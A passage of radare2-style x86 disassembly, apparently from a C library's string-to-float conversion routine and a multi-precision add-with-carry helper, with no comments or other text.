mov dword [var_8h], eax
call fcn.0808c6f0
test eax, eax
mov edx, eax
je 0x808af09
mov eax, dword [var_1070h]
mov dword [ebp + eax*4 - 0x82c], edx
inc eax
mov dword [var_1070h], eax
cmp dword [var_107ch], 1
mov esi, dword [var_1080h]
mov dword [var_106ch], esi
je 0x808b75b
cmp dword [var_107ch], 2
je 0x808b45a
mov eax, dword [var_107ch]
mov ecx, dword [var_107ch]
mov dword [var_110ch], 0
xor edi, edi
mov edx, dword [ebp + eax*4 - 0x1054]
mov esi, dword [ebp + eax*4 - 0x1050]
mov eax, dword [var_1070h]
mov dword [var_1108h], edx
sub ecx, eax
mov dword [var_8h], eax
lea eax, [ebp + ecx*4 - 0x104c]
mov dword [var_4h], eax
lea eax, [var_82ch]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
jle 0x808af9c
mov eax, dword [var_1070h]
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
mov dword [var_1070h], eax
mov eax, dword [var_1070h]
cmp eax, dword [var_107ch]
jge 0x808b438
mov edx, dword [var_107ch]
sub edx, eax
mov dword [var_1110h], edx
mov edx, dword [var_1080h]
test edx, edx
jle 0x808b3e1
mov eax, dword [var_1110h]
shl eax, 5
add eax, dword [var_1080h]
cmp eax, 0x40
jg 0x808b31e
mov ecx, dword [var_1070h]
mov eax, dword [var_1068h]
mov dword [var_1068h], 0
test ecx, ecx
mov dword [var_1064h], eax
jle 0x808b01e
mov eax, dword [var_1110h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x830]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x82c], eax
jg 0x808b002
mov edx, dword [var_1110h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x808b03b
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
cmp eax, edx
jl 0x808b02b
shl dword [var_1110h], 5
mov edx, dword [var_1110h]
add dword [var_1080h], edx
mov eax, dword [var_107ch]
cmp dword [var_1080h], 0x40
mov dword [ebp + eax*4 - 0x104c], 0
mov edx, eax
mov eax, dword [ebp + eax*4 - 0x82c]
mov ebx, eax
jg 0x808b1e6
lea ecx, [edx + 1]
lea eax, [edx - 1]
mov dword [var_111ch], ecx
mov dword [var_1118h], eax
cmp ebx, esi
mov edi, 0xffffffff
je 0x808b0e7
mov edx, dword [var_107ch]
mov eax, dword [ebp + edx*4 - 0x830]
mov edx, ebx
div esi
mov ecx, edx
mov edi, eax
mov eax, dword [var_1108h]
mul edi
cmp edx, ecx
mov ebx, eax
jbe 0x808b300
add ecx, esi
dec edi
cmp ecx, esi
jb 0x808b0e7
cmp ebx, dword [var_1108h]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_1108h]
cmp edx, ecx
ja 0x808b0b9
jne 0x808b0e7
mov eax, dword [var_107ch]
cmp ebx, dword [ebp + eax*4 - 0x834]
ja 0x808b0b9
mov edx, dword [var_111ch]
lea ecx, [var_104ch]
lea eax, [var_82ch]
mov dword [var_ch], edi
mov dword [var_4h], ecx
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.0808d600
mov edx, dword [var_107ch]
cmp dword [ebp + edx*4 - 0x82c], eax
je 0x808b13d
lea eax, [var_82ch]
lea ecx, [var_104ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov dword [esp], eax
dec edi
call fcn.0808c2a0
mov ecx, dword [var_107ch]
mov edx, dword [var_1118h]
mov eax, dword [ebp + ecx*4 - 0x830]
test edx, edx
mov dword [ebp + ecx*4 - 0x82c], eax
mov ebx, eax
jle 0x808b170
mov eax, dword [ebp + edx*4 - 0x830]
mov dword [ebp + edx*4 - 0x82c], eax
dec edx
test edx, edx
jg 0x808b15d
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b273
test edi, edi
mov edx, 0x20
je 0x808b18d
bsr edx, edi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b253
add edx, 0x40
mov eax, edi
mov dword [var_1120h], 0x61
sub ecx, edx
mov dword [var_110ch], edx
shr eax, cl
mov dword [var_1068h], eax
mov ecx, dword [var_1120h]
cmp ecx, 0x40
mov dword [var_1080h], ecx
jle 0x808b089
mov esi, dword [var_107ch]
mov eax, dword [ebp + esi*4 - 0x82c]
test eax, eax
mov edx, dword [var_107ch]
jne 0x808b204
test edx, edx
js 0x808b204
dec edx
mov ebx, dword [ebp + edx*4 - 0x82c]
test ebx, ebx
jne 0x808b204
test edx, edx
jns 0x808b1f4
mov ecx, dword [var_10e8h]
xor eax, eax
test ecx, ecx
jne 0x808b214
test edx, edx
js 0x808b219
mov eax, 1
mov dword [var_14h], eax
lea edx, [var_1068h]
mov dword [var_ch], edi
mov eax, 0x1f
mov dword [esp], edx
sub eax, dword [var_110ch]
mov dword [var_10h], eax
mov eax, dword [var_1074h]
mov dword [var_8h], eax
mov eax, dword [var_106ch]
dec eax
mov dword [var_4h], eax
jmp 0x808ac6e
neg edx
mov dword [var_1064h], 0
mov dword [var_1068h], edi
add edx, 0x20
mov dword [var_1120h], edx
jmp 0x808b1c4
mov eax, dword [var_1080h]
add eax, 0x20
cmp eax, 0x40
mov dword [var_1120h], eax
jg 0x808b29e
mov eax, dword [var_1068h]
mov dword [var_1068h], edi
mov dword [var_1064h], eax
jmp 0x808b1c4
mov dword [var_110ch], 0x40
mov edx, dword [var_1080h]
sub dword [var_110ch], edx
mov eax, dword [var_110ch]
test eax, eax
jle 0x808b1c4
mov ecx, dword [var_110ch]
lea eax, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], eax
mov dword [esp], eax
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, edi
mov ecx, 0x20
sub ecx, dword [var_110ch]
shr eax, cl
or dword [var_1068h], eax
jmp 0x808b1c4
jne 0x808b0e7
mov eax, dword [var_107ch]
cmp ebx, dword [ebp + eax*4 - 0x834]
ja 0x808b0b9
jmp 0x808b0e7
mov dword [var_110ch], 0x40
mov edx, dword [var_1080h]
sub dword [var_110ch], edx
cmp dword [var_110ch], 0x1f
jle 0x808b3aa
mov ebx, dword [var_110ch]
mov ecx, dword [var_110ch]
mov dword [var_8h], 2
add ebx, 0x1f
cmp dword [var_110ch], 0xffffffff
cmovg ebx, dword [var_110ch]
sar ebx, 5
mov eax, ebx
shl eax, 5
sub ecx, eax
lea eax, [var_1068h]
mov dword [var_4h], eax
mov dword [var_ch], ecx
lea eax, [ebp + ebx*4 - 0x1068]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
dec eax
js 0x808b03b
lea edx, [ebp + eax*4 - 0x1068]
mov dword [edx], 0
sub edx, 4
dec eax
jns 0x808b399
jmp 0x808b03b
mov eax, dword [var_110ch]
test eax, eax
jle 0x808b03b
mov edx, dword [var_110ch]
lea ecx, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
jmp 0x808b03b
test eax, eax
mov ecx, eax
jle 0x808b403
mov eax, dword [var_1110h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x830]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x82c], eax
jg 0x808b3e7
mov edx, dword [var_1110h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x808b420
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
cmp eax, edx
jl 0x808b410
shl dword [var_1110h], 5
mov edx, dword [var_1110h]
sub dword [var_106ch], edx
jmp 0x808b04e
test eax, eax
mov edx, eax
jle 0x808b04e
mov eax, dword [ebp + edx*4 - 0x830]
mov dword [ebp + edx*4 - 0x82c], eax
dec edx
test edx, edx
jg 0x808b442
jmp 0x808b04e
cmp dword [var_1070h], 1
mov eax, dword [var_1048h]
mov dword [var_1100h], 0
mov dword [var_1104h], 0
mov edi, dword [var_104ch]
mov dword [var_10fch], eax
jle 0x808b6aa
mov esi, dword [var_828h]
mov ebx, dword [var_82ch]
cmp dword [var_1080h], 0x40
jg 0x808b56e
cmp esi, dword [var_10fch]
je 0x808b676
mov eax, ebx
mov edx, esi
div dword [var_10fch]
mov ecx, edx
mov dword [var_1100h], eax
mul edi
mov esi, edx
mov ebx, eax
cmp esi, ecx
ja 0x808b4d4
jne 0x808b4ed
test ebx, ebx
je 0x808b4ed
add ecx, dword [var_10fch]
dec dword [var_1100h]
sub ebx, edi
sbb esi, 0
cmp ecx, dword [var_10fch]
jae 0x808b4ca
xor eax, eax
sub eax, ebx
sbb ecx, esi
mov esi, ecx
mov ebx, eax
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b5df
mov eax, dword [var_1100h]
mov edx, 0x20
test eax, eax
je 0x808b51e
bsr edx, dword [var_1100h]
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b5b9
mov eax, dword [ebp - 0x1100]
add edx, 0x40
mov dword [ebp - 0x1120], 0x61
sub ecx, edx
mov dword [ebp - 0x1104], edx
shr eax, cl
mov dword [ebp - 0x1068], eax
mov eax, dword [ebp - 0x1120]
cmp eax, 0x40
mov dword [ebp - 0x1080], eax
jle 0x808b4a6
mov ecx, dword [var_10e8h]
xor eax, eax
test ecx, ecx
jne 0x808b582
test esi, esi
jne 0x808b582
test ebx, ebx
je 0x808b587
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_1100h]
mov eax, 0x1f
sub eax, dword [var_1104h]
mov dword [var_ch], edx
mov dword [var_10h], eax
mov ecx, dword [var_1074h]
mov eax, dword [var_106ch]
mov dword [var_8h], ecx
jmp 0x808ac60
mov ecx, dword [ebp - 0x1100]
neg edx
mov dword [ebp - 0x1064], 0
add edx, 0x20
mov dword [ebp - 0x1120], edx
mov dword [ebp - 0x1068], ecx
jmp 0x808b559
mov eax, dword [var_1080h]
add eax, 0x20
cmp eax, 0x40
mov dword [var_1120h], eax
jg 0x808b610
mov eax, dword [var_1068h]
mov edx, dword [var_1100h]
mov dword [var_1064h], eax
mov dword [var_1068h], edx
jmp 0x808b559
mov dword [var_1104h], 0x40
mov ecx, dword [var_1080h]
sub dword [var_1104h], ecx
mov eax, dword [var_1104h]
test eax, eax
jle 0x808b559
mov eax, dword [ebp - 0x1104]
lea edx, [ebp - 0x1068]
mov dword [esp + 8], 2
mov dword [esp + 4], edx
mov dword [esp], edx
mov dword [esp + 0xc], eax
call fcn.0808c6f0
mov eax, dword [ebp - 0x1100]
mov ecx, 0x20
sub ecx, dword [ebp - 0x1104]
shr eax, cl
or dword [ebp - 0x1068], eax
jmp 0x808b559
lea ecx, [esi + ebx]
mov dword [var_1100h], 0xffffffff
cmp ecx, esi
jb 0x808b69a
test edi, edi
mov esi, edi
lea eax, [edi - 1]
mov ebx, edi
cmovne esi, eax
neg ebx
jmp 0x808b4ca
sub ecx, edi
xor ebx, ebx
mov esi, ecx
add ebx, edi
adc esi, 0
jmp 0x808b4f7
mov eax, dword [var_82ch]
cmp eax, dword [var_10fch]
jb 0x808b6c1
xor esi, esi
mov ebx, eax
jmp 0x808b499
mov ecx, dword [var_1080h]
test ecx, ecx
jle 0x808b74a
mov ebx, dword [var_1080h]
add ebx, 0x20
cmp ebx, 0x40
jg 0x808b704
mov eax, dword [var_1068h]
mov dword [var_1068h], 0
mov dword [var_1064h], eax
mov eax, dword [var_82ch]
mov dword [var_1080h], ebx
mov esi, eax
xor ebx, ebx
jmp 0x808b499
mov dword [var_1104h], 0x40
mov edx, dword [var_1080h]
sub dword [var_1104h], edx
mov edx, dword [var_1104h]
test edx, edx
jle 0x808b6f5
mov ecx, dword [var_1104h]
lea esi, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], esi
mov dword [esp], esi
mov dword [var_ch], ecx
call fcn.0808c6f0
jmp 0x808b6ef
mov ebx, dword [var_1080h]
sub ebx, 0x20
mov dword [var_106ch], ebx
jmp 0x808b6fb
mov dword [var_10f8h], 0
mov ebx, dword [var_82ch]
mov edi, dword [var_104ch]
xor eax, eax
mov edx, ebx
div edi
mov esi, eax
mov ebx, edx
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b826
test esi, esi
mov edx, 0x20
je 0x808b798
bsr edx, esi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b809
add edx, 0x40
mov eax, esi
mov dword [var_1120h], 0x61
sub ecx, edx
mov dword [var_10f8h], edx
shr eax, cl
mov dword [var_1068h], eax
mov edx, dword [var_1120h]
cmp edx, 0x40
mov dword [var_1080h], edx
jle 0x808b771
mov edi, dword [var_10e8h]
xor eax, eax
test edi, edi
jne 0x808b7ec
test ebx, ebx
je 0x808b7f1
mov eax, 1
mov dword [var_14h], eax
mov dword [var_ch], esi
mov eax, 0x1f
sub eax, dword [var_10f8h]
jmp 0x808b5a0
neg edx
mov dword [var_1064h], 0
mov dword [var_1068h], esi
add edx, 0x20
mov dword [var_1120h], edx
jmp 0x808b7cb
mov ecx, dword [var_1080h]
add ecx, 0x20
cmp ecx, 0x40
mov dword [var_1120h], ecx
jg 0x808b851
mov eax, dword [var_1068h]
mov dword [var_1068h], esi
mov dword [var_1064h], eax
jmp 0x808b7cb
mov dword [var_10f8h], 0x40
mov eax, dword [var_1080h]
sub dword [var_10f8h], eax
mov eax, dword [var_10f8h]
test eax, eax
jle 0x808b7cb
mov edx, dword [var_10f8h]
lea ecx, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, esi
mov ecx, 0x20
sub ecx, dword [var_10f8h]
shr eax, cl
or dword [var_1068h], eax
jmp 0x808b7cb
mov ecx, dword [var_107ch]
lea edi, [var_104ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x808ae40
mov edx, dword [var_10f4h]
mov ecx, dword [var_107ch]
mov esi, dword [var_10ech]
mov dword [var_10h], ecx
mov ecx, dword [var_10f0h]
mov dword [var_ch], esi
mov eax, dword [edx + 4]
sub eax, 2
mov dword [var_8h], eax
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edi, dword [var_10ech]
mov esi, dword [var_10f4h]
mov edx, dword [var_107ch]
add edx, dword [esi + 4]
mov esi, dword [var_10f0h]
mov dword [var_10f0h], edi
mov dword [var_10ech], esi
lea ecx, [edx - 2]
sub edx, 3
test eax, eax
cmovne edx, ecx
mov dword [var_107ch], edx
jmp 0x808ae1b
mov dword [ebp + eax*4 - 0x1068], 0
jmp 0x808ad3c
mov eax, dword [var_1080h]
mov edx, dword [var_1080h]
add eax, 0x1e
dec edx
cmovns eax, edx
mov dword [var_10e0h], edx
and eax, 0xffffffe0
sub edx, eax
cmp edx, 0x1f
je 0x808ba80
cmp edx, 0x1e
jg 0x808ba1a
mov ecx, dword [var_10cch]
mov eax, 0x1f
mov ebx, 2
sub eax, edx
lea esi, [var_82ch]
mov dword [var_ch], eax
mov dword [var_4h], esi
mov eax, ebx
sub eax, ecx
mov dword [var_8h], ecx
lea eax, [ebp + eax*4 - 0x1068]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
sub eax, dword [var_1070h]
test eax, eax
jle 0x808b9e0
lea edx, [var_1068h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808b9d4
mov ecx, dword [var_1074h]
mov esi, dword [var_10e0h]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], ecx
mov dword [var_4h], esi
lea eax, [var_1068h]
mov dword [esp], eax
jmp 0x808ac6e
lea eax, [edx - 0x1f]
lea edi, [var_1068h]
lea edx, [var_82ch]
mov dword [var_ch], eax
mov dword [var_4h], edx
mov eax, dword [var_10cch]
mov dword [var_8h], eax
mov eax, 2
sub eax, dword [var_10cch]
lea eax, [edi + eax*4]
mov dword [esp], eax
call fcn.0808c750
mov edx, 1
sub edx, dword [var_1070h]
test edx, edx
mov dword [ebp + edx*4 - 0x1068], eax
jle 0x808b9e0
mov ecx, edi
mov eax, edx
mov dword [ecx], 0
add ecx, 4
dec eax
jne 0x808ba6f
jmp 0x808b9e0
mov eax, 2
mov ecx, dword [var_10cch]
lea esi, [var_82ch]
mov edi, eax
sub edi, dword [var_10cch]
cld
shl ecx, 2
shr ecx, 2
lea edi, [ebp + edi*4 - 0x1068]
rep movsd dword es:[edi], dword ptr [esi]
sub eax, dword [var_1070h]
test eax, eax
jle 0x808b9e0
lea edx, [var_1068h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808babd
jmp 0x808b9e0
mov ecx, dword [var_1070h]
lea edi, [var_82ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x808ab49
mov dword [var_10h], edx
mov ecx, dword [var_10c0h]
mov dword [var_8h], esi
mov edx, dword [var_10c8h]
mov dword [var_ch], ecx
mov ecx, dword [var_10c4h]
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
jmp 0x808aae4
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x808a6a2
mov ecx, dword [var_1094h]
mov eax, ebx
neg ecx
cmp ebx, ecx
jge 0x808a9ca
mov eax, ecx
jmp 0x808a9ca
mov eax, dword [var_1084h]
mov ecx, dword [arg_14h]
mov dword [var_10bch], 1
mov esi, 0x1f
movzx edx, byte [eax]
mov edi, dword [ecx + 0x34]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x808bb83
inc dword [var_1084h]
mov eax, dword [var_1084h]
movzx edx, byte [eax]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
je 0x808bb6a
cmp dl, 0x30
je 0x808bd41
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x808bd2a
inc dword [var_1084h]
mov edx, eax
mov eax, dword [edx*4 + 0x80a6200]
dec dword [var_1090h]
mov dword [var_1080h], eax
mov eax, esi
sub eax, dword [var_1080h]
lea ecx, [eax + 1]
mov esi, eax
shl edx, cl
mov ecx, dword [var_1080h]
mov dword [var_1064h], edx
mov edx, dword [var_1094h]
lea eax, [ecx + edx*4]
add eax, dword [var_106ch]
lea ebx, [eax - 5]
mov eax, dword [var_1090h]
mov dword [var_106ch], ebx
test eax, eax
jle 0x808bc67
mov eax, dword [var_10bch]
lea ebx, [ebp + eax*4 - 0x1068]
mov ecx, dword [var_1084h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x808bc24
mov eax, dword [var_10a8h]
add ecx, eax
mov dword [var_1084h], ecx
movzx edx, byte [ecx]
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x808bd13
inc dword [var_1084h]
mov edx, eax
lea eax, [esi + 1]
cmp eax, 3
jle 0x808bcba
lea ecx, [esi - 3]
sub esi, 4
shl edx, cl
or dword [ebx], edx
dec dword [var_1090h]
mov eax, dword [var_1090h]
test eax, eax
jle 0x808bc67
mov eax, dword [var_10bch]
test eax, eax
jns 0x808bc00
mov ebx, dword [var_10bch]
test ebx, ebx
jle 0x808bc89
lea edx, [var_1068h]
mov eax, dword [var_10bch]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808bc7d
mov esi, dword [var_1074h]
mov eax, dword [var_106ch]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], esi
mov dword [var_4h], eax
jmp 0x808ba0c
mov ecx, 3
mov eax, edx
sub ebx, 4
sub ecx, esi
shr eax, cl
lea ecx, [esi + 0x1d]
or dword [ebx + 4], eax
shl edx, cl
dec dword [var_10bch]
js 0x808bce2
mov dword [ebx], edx
add esi, 0x1c
jmp 0x808bc4d
xor eax, eax
mov ecx, dword [var_1074h]
mov dword [var_10h], 0x1f
cmp dword [var_1090h], 0
mov dword [var_ch], edx
setg al
mov dword [var_8h], ecx
mov dword [var_14h], eax
mov eax, dword [var_106ch]
jmp 0x808ac61
mov ecx, dword [arg_14h]
inc dword [var_1084h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x808bc3b
mov ecx, dword [arg_14h]
inc dword [var_1084h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x808bba3
inc dword [var_1084h]
mov ecx, dword [var_1084h]
movzx edx, byte [ecx]
cmp dl, 0x30
je 0x808bd41
jmp 0x808bb8c
mov eax, dword [var_1098h]
mov edx, dword [var_106ch]
shl eax, 2
sub edx, eax
jmp 0x808a98a
test al, al
jne 0x808a922
jmp 0x808a95f
lea esi, [esi]
mov ecx, dword [var_109ch]
movzx eax, byte [ecx + 1]
jmp 0x808bd70
mov edx, dword [arg_ch]
test edx, edx
jne 0x808a69d
jmp 0x808a6a2
mov ecx, dword [arg_ch]
test ecx, ecx
je 0x808a6a2
mov eax, dword [arg_8h]
mov esi, dword [arg_ch]
mov dword [esi], eax
jmp 0x808a6a2
mov eax, dword [var_109ch]
movzx eax, byte [eax]
mov byte [var_1112h], al
mov edx, dword [var_1090h]
xor eax, eax
test edx, edx
mov dword [var_1094h], edx
setne al
xor ebx, ebx
dec eax
cmp byte [var_1112h], 0
mov dword [var_1098h], eax
je 0x808c147
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x808be09
mov edx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808bdf5
test al, al
jne 0x808c140
add edi, dword [var_10a8h]
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
ja 0x808c0fd
mov eax, dword [arg_14h]
mov ecx, dword [eax + 0x38]
mov edx, esi
cmp dl, 0x30
je 0x808be52
mov eax, dword [var_1090h]
sub eax, dword [var_1094h]
cmp dword [var_1098h], 0xffffffff
cmovne eax, dword [var_1098h]
mov dword [var_1098h], eax
inc dword [var_1090h]
inc edi
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808be2b
cmp dword [var_1078h], 0x10
mov edx, esi
movsx eax, dl
jne 0x808be7e
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808be7e
cmp edx, 0x66
jle 0x808be2b
cmp dword [var_1078h], 0x10
mov dword [var_108ch], edi
je 0x808c0f4
cmp dword [ecx + eax*4], 0x65
je 0x808bf81
mov esi, dword [var_1094h]
cmp dword [var_1090h], esi
jle 0x808beb9
mov eax, dword [var_108ch]
cmp byte [eax - 1], 0x30
je 0x808bf64
mov ecx, dword [var_1094h]
cmp dword [var_1090h], ecx
jne 0x808a8bb
mov ebx, dword [var_1090h]
test ebx, ebx
jle 0x808a8bb
mov ebx, dword [var_106ch]
test ebx, ebx
jns 0x808a8bb
cmp dword [var_1078h], 0x10
je 0x808bf48
mov eax, dword [var_108ch]
movzx ecx, byte [eax - 1]
movsx eax, cl
sub eax, 0x30
cmp eax, 9
ja 0x808bf40
cmp cl, 0x30
jne 0x808a8bb
dec dword [var_1090h]
inc ebx
dec dword [var_108ch]
mov ecx, dword [var_1090h]
dec dword [var_1094h]
mov dword [var_106ch], ebx
test ecx, ecx
jle 0x808a8bb
test ebx, ebx
js 0x808bee7
jmp 0x808a8bb
mov esi, esi
dec dword [var_108ch]
jmp 0x808bee7
mov esi, dword [var_108ch]
movzx ecx, byte [esi - 1]
mov esi, dword [arg_14h]
mov eax, dword [esi + 0x34]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x10
jne 0x808bf05
jmp 0x808bf40
dec dword [var_108ch]
dec dword [var_1090h]
mov edx, dword [var_108ch]
cmp byte [edx - 1], 0x30
je 0x808bf64
jmp 0x808beb9
inc edi
mov dword [var_10b8h], 0
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x2d
je 0x808c0e8
cmp al, 0x2b
je 0x808c0df
lea eax, [esi - 0x30]
cmp al, 9
ja 0x808c0d4
cmp dword [var_1078h], 0x10
je 0x808c0a1
mov eax, dword [var_10b8h]
test eax, eax
je 0x808c08a
mov edx, dword [var_1094h]
add edx, 0x1383
mov eax, dword [var_106ch]
lea eax, [eax + eax*4]
lea ebx, [eax + eax]
cmp ebx, edx
mov dword [var_106ch], ebx
jg 0x808c01e
mov ecx, esi
inc edi
movsx eax, cl
lea ebx, [eax + ebx - 0x30]
mov dword [var_106ch], ebx
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808bfd3
mov esi, dword [var_10b8h]
test esi, esi
je 0x808be9b
neg ebx
mov dword [var_106ch], ebx
jmp 0x808be9b
cmp dword [var_1098h], 0xffffffff
je 0x808c078
call fcn.08048b20
mov dword [eax], 0x22
mov eax, dword [var_10b8h]
test eax, eax
jne 0x808c074
mov eax, dword [var_1074h]
test eax, eax
je 0x808c06c
fld dword [0x80a6100]
inc edi
movzx eax, byte [edi]
sub eax, 0x30
cmp al, 9
jbe 0x808c04c
mov eax, dword [arg_ch]
test eax, eax
je 0x808a5c6
mov ecx, dword [arg_ch]
mov dword [ecx], edi
jmp 0x808a5c6
fld dword [0x80a61a0]
jmp 0x808c04c
fldz
jmp 0x808c04c
mov eax, dword [var_1074h]
test eax, eax
je 0x808c074
fld dword [0x80a6104]
jmp 0x808c04c
mov eax, dword [var_1098h]
sub eax, dword [var_1094h]
lea edx, [eax + 0x1344]
jmp 0x808bfd3
mov eax, dword [var_10b8h]
mov ecx, dword [var_1094h]
test eax, eax
lea edx, [ecx*4 + 0x403d]
jne 0x808bfd3
mov edx, dword [var_1098h]
mov eax, ecx
shl eax, 2
sub edx, eax
lea edx, [edx + 0x4000]
jmp 0x808bfd3
mov edi, dword [var_108ch]
jmp 0x808be9b
inc edi
movzx esi, byte [edi]
jmp 0x808bfa1
mov dword [var_10b8h], 1
jmp 0x808c0df
cmp dword [ecx + eax*4], 0x70
jmp 0x808be95
cmp dword [var_1078h], 0x10
je 0x808c116
mov ecx, esi
movsx eax, cl
mov esi, dword [arg_14h]
mov ecx, dword [esi + 0x38]
jmp 0x808be7e
mov edx, esi
movsx eax, dl
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808be7e
cmp edx, 0x66
jle 0x808be2b
jmp 0x808be7e
nop
lea esi, [esi]
mov edx, esi
movsx eax, dl
jmp 0x808c10b
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
jmp 0x808be09
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
jmp 0x808a806
mov edx, dword [arg_14h]
mov ecx, esi
movsx eax, cl
mov ecx, dword [edx + 0x38]
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jbe 0x808a7cb
cmp eax, 0x66
ja 0x808a7cb
inc dword [var_1090h]
jmp 0x808a800
mov eax, dword [arg_14h]
mov edx, esi
mov ecx, dword [eax + 0x38]
cmp dl, byte [ecx + 0x184]
jl 0x808c1aa
cmp dl, byte [ecx + 0x198]
jle 0x808a7a3
xor ebx, ebx
cmp byte [var_1111h], 0
je 0x808a7a3
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x808a7a3
mov edx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808c1c2
jmp 0x808a7a3
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
jmp 0x808a78b
mov ecx, esi
cmp cl, 0x30
jne 0x808a78f
inc edi
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x30
je 0x808c1f8
jmp 0x808a78f
mov edx, dword [arg_14h]
movsx eax, byte [edi + 1]
mov ecx, dword [edx + 0x38]
cmp dword [ecx + eax*4], 0x78
jne 0x808a731
add edi, 2
mov dword [var_1078h], 0x10
movzx esi, byte [edi]
mov dword [var_10a4h], 0
jmp 0x808a731
lea esi, [esi]
test al, al
jne 0x808a54d
jmp 0x808a53d
mov edx, dword [var_109ch]
movzx eax, byte [edx]
jmp 0x808c240
inc edi
movzx esi, byte [edi]
jmp 0x808a504
mov dword [var_1074h], 1
jmp 0x808c258
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0808a440
leave
ret
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
mov edi, dword [arg_ch]
mov esi, dword [arg_10h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov eax, ecx
shr ecx, 3
neg eax
and eax, 7
je 0x808c2d8
inc ecx
shl eax, 2
sub edi, eax
sub esi, eax
sub edx, eax
shr eax, 2
lea eax, [eax + eax*8 + 0x808c2d5]
jmp eax
lea esi, [esi]
mov eax, dword [esi]
adc eax, dword [edx]
mov dword [edi], eax
mov eax, dword [esi + 4]
adc eax, dword [edx + 4]
mov dword [edi + 4], eax
mov eax, dword [esi + 8]
adc eax, dword [edx + 8]
mov dword [edi + 8], eax
mov eax, dword [esi + 0xc]
adc eax, dword [edx + 0xc]
mov dword [edi + 0xc], eax
mov eax, dword [esi + 0x10]
adc eax, dword [edx + 0x10]
mov dword [edi + 0x10], eax
mov eax, dword [esi + 0x14]
adc eax, dword [edx + 0x14]
mov dword [edi + 0x14], eax
mov eax, dword [esi + 0x18]
adc eax, dword [edx + 0x18]
mov dword [edi + 0x18], eax
mov eax, dword [esi + 0x1c]
adc eax, dword [edx + 0x1c]
